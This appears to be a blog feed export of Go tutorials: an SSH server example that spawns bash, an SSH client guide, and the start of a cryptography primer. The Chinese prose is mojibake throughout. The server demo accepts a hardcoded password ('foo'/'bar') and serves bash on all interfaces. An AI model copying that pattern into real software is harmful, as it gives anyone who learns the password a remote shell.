ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; // Should use constant-time compare (or better, salt+hash) in a production setting. if c.User() == "foo" &amp;&amp; string(pass) == "bar" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;, // You may also explicitly allow anonymous client authentication, though anon bash // sessions may not be a wise idea // NoClientAuth: true, &#125; // You can generate a keypair with 'ssh-keygen -t rsa' privateBytes, err := ioutil.ReadFile("id_rsa") if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)") &#125; private, err := ssh.ParsePrivateKey(privateBytes) if err != nil &#123; log.Fatal("Failed to parse private key") &#125; config.AddHostKey(private) // Once a ServerConfig has been configured, connections can be accepted. listener, err := net.Listen("tcp", "0.0.0.0:2200") if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err) &#125; // Accept all connections log.Print("Listening on 2200...") for &#123; tcpConn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; // Before use, a handshake must be performed on the incoming net.Conn. sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion()) // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans) &#125;&#125;func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; // Service the incoming Channel channel in go routine for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125;func handleChannel(newChannel ssh.NewChannel) &#123; // Since we're handling a shell, we expect a // channel type of "session". The also describes // "x11", "direct-tcpip" and "forwarded-tcpip" // channel types. if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t)) return &#125; // At this point, we have the opportunity to reject the client's // request for another logical connection connection, requests, err := newChannel.Accept() if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return &#125; // Fire up bash for this session bash := exec.Command("bash") // Prepare teardown function close := func() &#123; connection.Close() _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; log.Printf("Session closed") &#125; // Allocate a terminal for this channel log.Print("Creating pty...") bashf, err := pty.Start(bash) if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return &#125; //pipe session to bash and visa-versa var once sync.Once go func() &#123; io.Copy(connection, bashf) once.Do(close) &#125;() go func() &#123; io.Copy(bashf, connection) once.Do(close) &#125;() // Sessions have out-of-band requests such as "shell", "pty-req" and "env" go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) // Responding true (OK) here will let the client // know we have a pty ready for input req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125;// parseDims extracts terminal dimensions (width x height) from the provided buffer.func parseDims(b []byte) (uint32, uint32) &#123; w := binary.BigEndian.Uint32(b) h := binary.BigEndian.Uint32(b[4:]) return w, h&#125;// Winsize stores the Height and Width of a terminal.type Winsize struct &#123; Height uint16 Width uint16 x uint16 // unused y uint16 // unused&#125;// SetWinsize sets the size of the given pty.func SetWinsize(fd uintptr, w, h uint32) &#123; ws := &amp;Winsize&#123;Width: uint16(w), Height: uint16(h)&#125; syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(ä¸‰)-Golangä¸­SSHå®¢æˆ·ç«¯çš„å®žçŽ°]]></title>
    <url>%2F2017%2F02%2F22%2Fssh-protocol-go%2F</url>
    <content type="text"><![CDATA[ä¸Šé¢å‡ ç¯‡åšå®¢å·²ç»ä»‹ç»è¿‡åŠ å¯†ç®—æ³•å’Œsshåè®®çš„æž„æˆ, è¿™ç¯‡åšå®¢ä¸»è¦å°†ä»‹ç»golangä¸­sshåº“çš„ä¸€äº›å…·ä½“ä½¿ç”¨,ä¸ºåŽé¢å†™sshçš„è·³æ¿æœºåšé“ºåž«ã€‚ æ —å­å…ˆä¸Š2ä¸ªæ —å­, åŽé¢ä¼šå¯¹æ­¤åšè¯¦ç»†ä»‹ç»Shelläº¤äº’æ¨¡å¼1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125; è¿œç¨‹å‘½ä»¤æ¨¡å¼123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String())&#125; ç®€ä»‹SSH(Secure Shell)æ˜¯ä¸€ä¸ªæä¾›æ•°æ®é€šä¿¡å®‰å…¨ã€è¿œç¨‹ç™»å½•ã€è¿œç¨‹æŒ‡ä»¤æ‰§è¡Œç­‰åŠŸèƒ½çš„å®‰å…¨ç½‘ç»œåè®®, å…·ä½“å¯ä»¥æŸ¥é˜…æˆ‘çš„ä¸Šä¸€ç¯‡åšå®¢è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŽŸç†ç®€ä»‹ä½†æ˜¯golangçš„sshåŒ…å¹¶ä¸åœ¨golangçš„æ ‡å‡†åº“ä¸­, åœ¨: godoc.org/golang.org/x/crypto/sshä¸­, æ‰€ä»¥éœ€è¦ç¿»å¢™æ‰èƒ½ä¸‹åˆ°ã€‚golangçš„è¿™ä¸ªsshåŒ…åŒæ—¶å®žçŽ°äº†sshçš„å®¢æˆ·ç«¯å’Œserverç«¯, ä¹Ÿè®¸ä½ ä¹Ÿç»å¸¸çœ‹åˆ°ä¸€ä¸ªssh-agentçš„ä¸œè¥¿, ä¹Ÿåœ¨è¿™ä¸ªåŒ…æ‹¬, ä½†æˆ‘ä¸å°†ä»–å½’çº³åœ¨clientå’Œserveré‡Œé¢, å› ä¸ºssh-agentæ˜¯ä¸€ä¸ªç”¨äºŽä¿å­˜ç§é’¥çš„ç¨‹åº, åœ¨æ•°å­—ç­¾åéªŒè¯æ—¶(RSA, DSA, ECDSA, Ed25519)æä¾›èº«ä»½è®¤è¯, å®ƒå°±æ˜¯ä¸€ä¸ªå¸®åŠ©æˆ‘ä»¬éªŒè¯èº«ä»½çš„ç¨‹åºã€‚æŽ¥ä¸‹æ¥ä¸»è¦è®²ssh clent, ä½†æ˜¯è¿˜æ˜¯ä¼šæ¶‰åŠåˆ°ä¸€ç‚¹ssh-agentçš„éƒ¨åˆ†ã€‚ è®¤è¯è¦ä½¿ç”¨sshçš„å®¢æˆ·ç«¯, é‚£ä¹ˆè®¤è¯å°±æ¯”è¾ƒå…³é”®äº†, sshæä¾›2ç§è®¤è¯æ–¹å¼: ç”¨æˆ·åå¯†ç è®¤è¯å’Œå¯†é’¥è®¤è¯ã€‚é€šè¿‡sshæä¾›çš„ä¸€ä¸ªconfigå¯¹è±¡, æˆ‘ä»¬å¯ä»¥é…ç½®sshä½¿ç”¨çš„è®¤è¯æ–¹å¼. è€Œé…ç½®å¯¹è±¡é‡Œé¢å…³äºŽè®¤è¯çš„é…ç½®ä½¿ç”¨çš„æ˜¯ssh.AuthMethodæŽ¥å£, ssh.AuthMethodæ˜¯authçš„æ€»æŽ¥å£(å­˜å‚¨å®žçŽ°äº†auth å’Œ methodçš„å¯¹è±¡), AuthMethodå‘ˆçŽ°çš„æ˜¯ä¸€ä¸ªå®žçŽ°äº†RFC4252è®¤è¯æ–¹æ³•çš„å®žä¾‹ã€‚ ç”¨æˆ·åå¯†ç è®¤è¯è®¤è¯æ–¹å¼å¦‚æžœä½¿ç”¨Passwordæ–¹å¼çš„è¯ é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ssh.Passwordæ–¹æ³•èŽ·å–ä¸€ä¸ªAuthMethodæŽ¥å£å¯¹è±¡ã€‚123456sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; ssh.Password("your_password") &#125;,&#125; å¯†é’¥è®¤è¯å‰æ: å¯†é’¥è®¤è¯çš„æœ¬è´¨æ˜¯ä½¿ç”¨éžå¯¹ç§°åŠ å¯†çš„æ•°å­—ç­¾ååŠŸèƒ½, æ‰€ä»¥å¿…é¡»å°†ä½ çš„å…¬å…±å¯†é’¥å¡«å……åˆ°ä¸€ä¸ªè¿œç¨‹æœºå™¨ä¸Šçš„authorized_keysæ–‡ä»¶ä¸­ ä½ å¯ä»¥æ‰‹åŠ¨å®Œæˆ, ä¹Ÿå¯ä»¥ä½¿ç”¨ssh-copy-idè¿™ä¸ªå‘½ä»¤æ¥å¸®ä½ å®Œæˆã€‚åœ¨å…¬é’¥æŽ¨é€okè¿‡åŽ, ä½¿ç”¨ç§˜é’¥è®¤è¯, è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥èŽ·å–ç”¨æˆ·çš„ç§é’¥, ç”¨äºŽç­¾åç®—æ³•æ—¶åšèº«ä»½è®¤è¯: ä»Žç§˜é’¥æ–‡ä»¶ä¸­è¯»å–å’Œssh-agentä¸­è¯»å–ã€‚ ç§é’¥æ–‡ä»¶è¯»å–ç§é’¥æ–‡ä»¶, ç„¶åŽä½¿ç”¨ssh.PublicKeysæ–¹æ³• èŽ·å–ä¸€ä¸ªAuthMethodæŽ¥å£å¯¹è±¡, è¿™é‡Œæˆ‘å†æ¬¡å°è£…äº†ä¸‹, é€šè¿‡PublicKeyFileå¯ä»¥ç›´æŽ¥èŽ·å–ä¸€ä¸ªå…¬é’¥çš„AuthMethodæŽ¥å£ã€‚12345678910111213141516171819func PublicKeyFile(file string) ssh.AuthMethod &#123; buffer, err := ioutil.ReadFile(file) if err != nil &#123; return nil &#125; key, err := ssh.ParsePrivateKey(buffer) if err != nil &#123; return nil &#125; return ssh.PublicKeys(key)&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; PublicKeyFile("/path/to/your/pub/certificate/key") &#125;,&#125; SSH AgentSSH Agent æ˜¯ä¸€ä¸ª*nixç³»ç»Ÿé‡Œé¢çš„å·¥å…·, ä»–å°†ç”¨æˆ·ç§é’¥ä¿å­˜åœ¨ä¸€å¼ åŠ å¯†çš„è¡¨ä¸­, ä¸ºäº†é¿å…å‘½ä»¤è¡Œçš„å‚æ•°ä¼ å…¥, å¾ˆå¤šç”¨æˆ·è¿˜æ˜¯æ„¿æ„å°†ä»–ä»¬çš„ç§˜é’¥äº¤ç»™ssh agentç®¡ç†ã€‚ä¸ºäº†èƒ½èŽ·å–åˆ°ä½ å­˜å‚¨åœ¨ssh agentä¸­çš„ç§é’¥, ä½ é¦–å…ˆçš„å°†ä½ çš„ç§é’¥æäº¤ç»™ssh agentä¿ç®¡,æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:1$ ssh-add /path/to/your/private/certificate/file æˆ‘ä»¬å¯ä»¥é€šè¿‡socket(net.Dial)è®¿é—®åˆ°é‡Œé¢å­˜å‚¨çš„ç§é’¥, ç„¶åŽä½¿ç”¨å·¥åŽ‚å‡½æ•°ssh.PublicKeysCallbackæ¥åˆ›å»ºä¸€ä¸ªssh agentçš„AuthMethodå®žä¾‹ã€‚12345678910111213func SSHAgent() ssh.AuthMethod &#123; if sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err == nil &#123; return ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers) &#125; return nil&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; SSHAgent() &#125;,&#125; å»ºç«‹é“¾æŽ¥å½“æˆ‘ä»¬é€šè¿‡ssh.ClientConfigå¯¹è±¡è®¾ç½®å¥½sshçš„é…ç½®è¿‡åŽ, æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ssh.Dialæ–¹æ³•æ¥å»ºç«‹ä¸€ä¸ªsshè¿žæŽ¥äº†1234connection, err := ssh.Dial("tcp", "host:port", sshConfig)if err != nil &#123; return nil, fmt.Errorf("Failed to dial: %s", err)&#125; åˆ›å»ºå›žè¯ä¸Žäº¤æ¢å½“sshè¿žæŽ¥å»ºç«‹è¿‡åŽ, æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªè¿žæŽ¥å»ºç«‹ä¸€ä¸ªå›žè¯, åœ¨å›žè¯ä¸Šå’Œè¿œç¨‹ä¸»æœºé€šä¿¡ã€‚1234session, err := connection.NewSession()if err != nil &#123; return nil, fmt.Errorf("Failed to create session: %s", err)&#125; ä½†æ˜¯é€šä¿¡ä¹‹å‰æˆ‘ä»¬éœ€è¦è¯·æ±‚åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªä¼ªç»ˆç«¯(ptyå…¨ç§°pseudo terminal), ç®€å•è¯´æ¥ptyæ˜¯ä¸€å¯¹å­—ç¬¦è®¾å¤‡, æä¾›ä¸€ä¸ªåŒå‘æ²Ÿé€šçš„æ¸ é“ï¼Œå¤§æ¦‚è¿‡ç¨‹æ˜¯è¿™æ ·(pty master &lt;â€”sessionâ€”&gt; pty slave), å…³äºŽå¯¹ptyçš„æ›´è¯¦å°½çš„ä»‹ç»å¯ä»¥å‚è€ƒTTYçš„é‚£äº›äº‹å„¿12345678910modes := ssh.TerminalModes&#123; ssh.ECHO: 0, // disable echoing ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud&#125;if err := session.RequestPty("xterm", 80, 40, modes); err != nil &#123; session.Close() return nil, fmt.Errorf("request for pseudo terminal failed: %s", err)&#125; è¿œç¨‹ä¸»æœºå¼€å¯ptyç»ˆç«¯è¿‡åŽ, æˆ‘ä»¬å°±å¯ä»¥ç›´æŽ¥é€šè¿‡Runå‘é€å‘½ä»¤äº†, è¿™é‡Œæˆ‘ä»¬é€šè¿‡Setenvè®¾ç½®sessionçš„çŽ¯å¢ƒå˜é‡, sessionæ‰§è¡Œçš„ç»“æžœé€šè¿‡Stdout, Stderrè¿”å›ž, è¿™é‡Œä½¿ç”¨ä¸€ä¸ªBufferæ¥ä¿å­˜è¿™äº›ç»“æžœã€‚123456789if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error())&#125;var b bytes.Buffersession.Stdout, session.Stderr = &amp;b, &amp;bif err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error())&#125; å¦‚æžœæˆ‘ä»¬ä½¿ç”¨Shellæ¨¡å¼çš„è¯, æˆ‘ä»¬éœ€è¦åœ¨ptmxä¸Šåˆ›å»ºä¸€ä¸ªterminal, è¿™æ ·å¯¹ä»–çš„æ“ä½œæ‰ä¼šååº”åˆ°ptsä¸Š ,å¤§æ¦‚çš„åŽŸç†æ˜¯è¿™æ ·: ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;gettyä¸ºäº†è¯´æ¸…æ¥šåŽŸç†, æˆ‘å¼•ç”¨äº†åˆ«äººçš„è¯,å¸Œæœ›èƒ½æ–¹ä¾¿ä½ ç†è§£: å¦‚æžœæŸäººåœ¨ç½‘ä¸Šä½¿ç”¨telnetç¨‹åºè¿žæŽ¥åˆ°ä½ çš„è®¡ç®—æœºä¸Šï¼Œåˆ™telnetç¨‹åºå°±å¯èƒ½ä¼šæ‰“å¼€/dev/ptmxè®¾å¤‡èŽ·å–ä¸€ä¸ªfdã€‚æ­¤æ—¶ä¸€ä¸ªgettyç¨‹åºå°±åº”è¯¥è¿è¡Œåœ¨å¯¹åº”çš„/dev/pts/ä¸Šã€‚å½“telnetä»Žè¿œç«¯èŽ·å–äº†ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œè¯¥å­—ç¬¦å°±ä¼šé€šè¿‡ptmxã€pts/ä¼ é€’ç»™ gettyç¨‹åºï¼Œè€Œgettyç¨‹åºå°±ä¼šé€šè¿‡pts/*ã€ptmxå’Œtelnetç¨‹åºå¾€ç½‘ç»œä¸Šè¿”å›žâ€œlogin:â€å­—ç¬¦ä¸²ä¿¡æ¯ã€‚è¿™æ ·ï¼Œç™»å½•ç¨‹åºä¸Žtelnetç¨‹åºå°±é€šè¿‡ä¼ªç»ˆç«¯è¿›è¡Œé€šä¿¡ã€‚ 123456789101112131415161718session.Stdout = os.Stdoutsession.Stderr = os.Stderrsession.Stdin = os.Stdinmodes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400,&#125;termFD := int(os.Stdin.Fd())w, h, _ := terminal.GetSize(termFD)termState, _ := terminal.MakeRaw(termFD)defer terminal.Restore(termFD, termState)err = session.RequestPty("xterm-256color", h, w, modes)ce(err, "request pty") æ€»ç»“å…¶å®žTTYæ˜¯ä¸€ä¸ªå¾ˆå¤§å¾ˆç»å…¸çš„è¯é¢˜, åŽé¢åšWeb Terminalæ—¶, è¿˜å¾—ä½¿ç”¨xtermè¿™ç§ç±»åž‹çš„pty, ç”±äºŽç¯‡å¹…æœ‰é™, æ²¡æœ‰å±•å¼€, ä»¥åŽè¡¥ä¸Šã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¯†ç å­¦ç®€ä»‹ä¸ŽGolangçš„åŠ å¯†åº“Cryptoçš„ä½¿ç”¨]]></title>
    <url>%2F2017%2F02%2F19%2Fgo-crypto%2F</url>
    <content type="text"><![CDATA[æ®è®°è½½ï¼Œå…¬å…ƒå‰400å¹´ï¼Œå¤å¸Œè…Šäººå‘æ˜Žäº†ç½®æ¢å¯†ç ã€‚1881å¹´ä¸–ç•Œä¸Šçš„ç¬¬ä¸€ä¸ªç”µè¯ä¿å¯†ä¸“åˆ©å‡ºçŽ°ã€‚åœ¨ç¬¬äºŒæ¬¡ä¸–ç•Œå¤§æˆ˜æœŸé—´ï¼Œå¾·å›½å†›æ–¹å¯ç”¨â€œæ©å°¼æ ¼çŽ›â€å¯†ç æœºï¼Œå¯†ç å­¦åœ¨æˆ˜äº‰ä¸­èµ·ç€éžå¸¸é‡è¦çš„ä½œç”¨, è¿™æ®µåŽ†å²å¾ˆæœ‰è¶£,å»ºè®®çœ‹çœ‹æ©æ ¼çŽ›æœºç ´è§£åŽ†å²ã€‚éšç€ä¿¡æ¯åŒ–å’Œæ•°å­—åŒ–ç¤¾ä¼šçš„å‘å±•ï¼Œäººä»¬å¯¹ä¿¡æ¯å®‰å…¨å’Œä¿å¯†çš„é‡è¦æ€§è®¤è¯†ä¸æ–­æé«˜ï¼ŒäºŽæ˜¯åœ¨1997å¹´ï¼Œç¾Žå›½å›½å®¶æ ‡å‡†å±€å…¬å¸ƒå®žæ–½äº†â€œç¾Žå›½æ•°æ®åŠ å¯†æ ‡å‡†ï¼ˆDESï¼‰â€ï¼Œæ°‘é—´åŠ›é‡å¼€å§‹å…¨é¢ä»‹å…¥å¯†ç å­¦çš„ç ”ç©¶å’Œåº”ç”¨ä¸­ï¼Œé‡‡ç”¨çš„åŠ å¯†ç®—æ³•æœ‰DESã€RSAã€SHAç­‰ã€‚éšç€å¯¹åŠ å¯†å¼ºåº¦éœ€æ±‚çš„ä¸æ–­æé«˜ï¼Œè¿‘æœŸåˆå‡ºçŽ°äº†AESã€ECCç­‰ã€‚ å¯†ç å­¦çš„ç›®çš„ ä¿å¯†æ€§ï¼šé˜²æ­¢ç”¨æˆ·çš„æ ‡è¯†æˆ–æ•°æ®è¢«è¯»å–ã€‚ æ•°æ®å®Œæ•´æ€§ï¼šé˜²æ­¢æ•°æ®è¢«æ›´æ”¹ã€‚ èº«ä»½éªŒè¯ï¼šç¡®ä¿æ•°æ®å‘è‡ªç‰¹å®šçš„ä¸€æ–¹ã€‚ å¯†ç å­¦çš„åº”ç”¨éšç€å¯†ç å­¦å•†ä¸šåº”ç”¨çš„æ™®åŠï¼Œå…¬é’¥å¯†ç å­¦å—åˆ°å‰æ‰€æœªæœ‰çš„é‡è§†ã€‚é™¤ä¼ ç»Ÿçš„å¯†ç åº”ç”¨ç³»ç»Ÿå¤–ï¼ŒPKIç³»ç»Ÿä»¥å…¬é’¥å¯†ç æŠ€æœ¯ä¸ºä¸»ï¼Œæä¾›åŠ å¯†ã€ç­¾åã€è®¤è¯ã€å¯†é’¥ç®¡ç†ã€åˆ†é…ç­‰åŠŸèƒ½ã€‚ ä¿å¯†é€šä¿¡ï¼šä¿å¯†é€šä¿¡æ˜¯å¯†ç å­¦äº§ç”Ÿçš„åŠ¨å› ã€‚ä½¿ç”¨å…¬ç§é’¥å¯†ç ä½“åˆ¶è¿›è¡Œä¿å¯†é€šä¿¡æ—¶ï¼Œä¿¡æ¯æŽ¥æ”¶è€…åªæœ‰çŸ¥é“å¯¹åº”çš„å¯†é’¥æ‰å¯ä»¥è§£å¯†è¯¥ä¿¡æ¯ã€‚ æ•°å­—ç­¾åï¼šæ•°å­—ç­¾åæŠ€æœ¯å¯ä»¥ä»£æ›¿ä¼ ç»Ÿçš„æ‰‹å†™ç­¾åï¼Œè€Œä¸”ä»Žå®‰å…¨çš„è§’åº¦è€ƒè™‘ï¼Œæ•°å­—ç­¾åå…·æœ‰å¾ˆå¥½çš„é˜²ä¼ªé€ åŠŸèƒ½ã€‚åœ¨æ”¿åºœæœºå…³ã€å†›äº‹é¢†åŸŸã€å•†ä¸šé¢†åŸŸæœ‰å¹¿æ³›çš„åº”ç”¨çŽ¯å¢ƒã€‚ ç§˜å¯†å…±äº«ï¼šç§˜å¯†å…±äº«æŠ€æœ¯æ˜¯æŒ‡å°†ä¸€ä¸ªç§˜å¯†ä¿¡æ¯åˆ©ç”¨å¯†ç æŠ€æœ¯åˆ†æ‹†æˆnä¸ªç§°ä¸ºå…±äº«å› å­çš„ä¿¡æ¯ï¼Œåˆ†å‘ç»™nä¸ªæˆå‘˜ï¼Œåªæœ‰k(kâ‰¤n)ä¸ªåˆæ³•æˆå‘˜çš„å…±äº«å› å­æ‰å¯ä»¥æ¢å¤è¯¥ç§˜å¯†ä¿¡æ¯ï¼Œå…¶ä¸­ä»»ä½•ä¸€ä¸ªæˆ–m(mâ‰¤k)ä¸ªæˆå‘˜åˆä½œéƒ½ä¸çŸ¥é“è¯¥ç§˜å¯†ä¿¡æ¯ã€‚åˆ©ç”¨ç§˜å¯†å…±äº«æŠ€æœ¯å¯ä»¥æŽ§åˆ¶ä»»ä½•éœ€è¦å¤šä¸ªäººå…±åŒæŽ§åˆ¶çš„ç§˜å¯†ä¿¡æ¯ã€å‘½ä»¤ç­‰ã€‚ è®¤è¯åŠŸèƒ½ï¼šåœ¨å…¬å¼€çš„ä¿¡é“ä¸Šè¿›è¡Œæ•æ„Ÿä¿¡æ¯çš„ä¼ è¾“ï¼Œé‡‡ç”¨ç­¾åæŠ€æœ¯å®žçŽ°å¯¹æ¶ˆæ¯çš„çœŸå®žæ€§ã€å®Œæ•´æ€§è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡éªŒè¯å…¬é’¥è¯ä¹¦å®žçŽ°å¯¹é€šä¿¡ä¸»ä½“çš„èº«ä»½éªŒè¯ã€‚ å¯†é’¥ç®¡ç†ï¼šå¯†é’¥æ˜¯ä¿å¯†ç³»ç»Ÿä¸­æ›´ä¸ºè„†å¼±è€Œé‡è¦çš„çŽ¯èŠ‚ï¼Œå…¬é’¥å¯†ç ä½“åˆ¶æ˜¯è§£å†³å¯†é’¥ç®¡ç†å·¥ä½œçš„æœ‰åŠ›å·¥å…·ï¼›åˆ©ç”¨å…¬é’¥å¯†ç ä½“åˆ¶è¿›è¡Œå¯†é’¥åå•†å’Œäº§ç”Ÿï¼Œä¿å¯†é€šä¿¡åŒæ–¹ä¸éœ€è¦äº‹å…ˆå…±äº«ç§˜å¯†ä¿¡æ¯ï¼›åˆ©ç”¨å…¬é’¥å¯†ç ä½“åˆ¶è¿›è¡Œå¯†é’¥åˆ†å‘ã€ä¿æŠ¤ã€å¯†é’¥æ‰˜ç®¡ã€å¯†é’¥æ¢å¤ç­‰ã€‚ åŠ å¯†ç®—æ³•ä»‹ç»æ ¹æ®å¯†é’¥ç±»åž‹ä¸åŒå°†çŽ°ä»£å¯†ç æŠ€æœ¯åˆ†ä¸ºä¸¤ç±»ï¼š å¯¹ç§°åŠ å¯†ç®—æ³•: åŠ å¯†å’Œè§£å¯†å‡é‡‡ç”¨åŒä¸€æŠŠç§˜å¯†é’¥åŒ™ã€‚ éžå¯¹ç§°åŠ å¯†ç®—æ³•: æœ‰2æŠŠå¯†é’¥,å…¬é’¥å’Œç§é’¥, å…¬é’¥åŠ å¯†, ç§é’¥è§£å¯†ã€‚ å¯¹ç§°åŠ å¯†ç®—æ³•å¯¹ç§°åŠ å¯†ç®—æ³•ç”¨æ¥å¯¹æ•æ„Ÿæ•°æ®ç­‰ä¿¡æ¯è¿›è¡ŒåŠ å¯†ï¼Œå¸¸ç”¨çš„ç®—æ³•åŒ…æ‹¬ï¼š DES(Data Encryption Standard): æ•°æ®åŠ å¯†æ ‡å‡†ï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œé€‚ç”¨äºŽåŠ å¯†å¤§é‡æ•°æ®çš„åœºåˆã€‚ 3DES(Triple DES): æ˜¯åŸºäºŽDESï¼Œå¯¹ä¸€å—æ•°æ®ç”¨ä¸‰ä¸ªä¸åŒçš„å¯†é’¥è¿›è¡Œä¸‰æ¬¡åŠ å¯†ï¼Œå¼ºåº¦æ›´é«˜ã€‚ AES(Advanced Encryption Standard): é«˜çº§åŠ å¯†æ ‡å‡†ï¼Œæ˜¯ä¸‹ä¸€ä»£çš„åŠ å¯†ç®—æ³•æ ‡å‡†ï¼Œé€Ÿåº¦å¿«ï¼Œå®‰å…¨çº§åˆ«é«˜ï¼› AES2000å¹´10æœˆï¼ŒNIST(ç¾Žå›½å›½å®¶æ ‡å‡†å’ŒæŠ€æœ¯åä¼š)å®£å¸ƒé€šè¿‡ä»Ž15ç§ä¾¯é€‰ç®—æ³•ä¸­é€‰å‡ºçš„ä¸€é¡¹æ–°çš„å¯†åŒ™åŠ å¯†æ ‡å‡†ã€‚Rijndaelè¢«é€‰ä¸­æˆä¸ºå°†æ¥çš„AESã€‚ Rijndaelæ˜¯åœ¨1999å¹´ä¸‹åŠå¹´ï¼Œç”±ç ”ç©¶å‘˜Joan Daemenå’ŒVincent Rijmenåˆ›å»ºçš„ã€‚AESæ­£æ—¥ç›Šæˆä¸ºåŠ å¯†å„ç§å½¢å¼çš„ç”µå­æ•°æ®çš„å®žé™…æ ‡å‡†ã€‚å¹¶äºŽ2002å¹´5æœˆ26æ—¥åˆ¶å®šäº†æ–°çš„é«˜çº§åŠ å¯†æ ‡å‡† (AES) è§„èŒƒã€‚ç®—æ³•åŽŸç† AESç®—æ³•åŸºäºŽæŽ’åˆ—å’Œç½®æ¢è¿ç®—ã€‚æŽ’åˆ—æ˜¯å¯¹æ•°æ®é‡æ–°è¿›è¡Œå®‰æŽ’ï¼Œç½®æ¢æ˜¯å°†ä¸€ä¸ªæ•°æ®å•å…ƒæ›¿æ¢ä¸ºå¦ä¸€ä¸ªã€‚AES ä½¿ç”¨å‡ 